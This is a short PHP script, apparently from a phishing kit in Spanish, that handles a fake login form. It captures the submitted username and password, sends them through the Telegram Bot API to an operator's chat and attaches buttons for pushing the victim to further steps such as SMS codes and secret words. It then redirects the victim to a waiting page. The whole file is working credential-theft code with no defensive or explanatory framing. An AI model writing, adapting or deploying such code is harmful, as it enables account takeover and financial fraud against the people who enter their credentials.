<?php
session_start();
$usuario = $_POST['usuario'];
$clave = $_POST['clave'];
$_SESSION['usuario'] = $usuario;

$mensaje = "Nuevo login:\nUsuario: $usuario\nClave: $clave";

require_once("settings.php");
$keyboard = [
    "inline_keyboard" => [
        [
            ["text" => "📩 SMS", "callback_data" => "SMS|$usuario"],
            ["text" => "❓ Palabra clave", "callback_data" => "CLAVE|$usuario"]
        ],
        [
            ["text" => "📍 LOGIN ERROR", "callback_data" => "ERROR|$usuario"],
            ["text" => "📧 Correo", "callback_data" => "SMSERROR|$usuario"]
        ]
    ]
];

$data = [
    "chat_id" => $chat_id,
    "text" => $mensaje,
    "reply_markup" => json_encode($keyboard)
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));
header("Location: espera.php");
exit;
?>
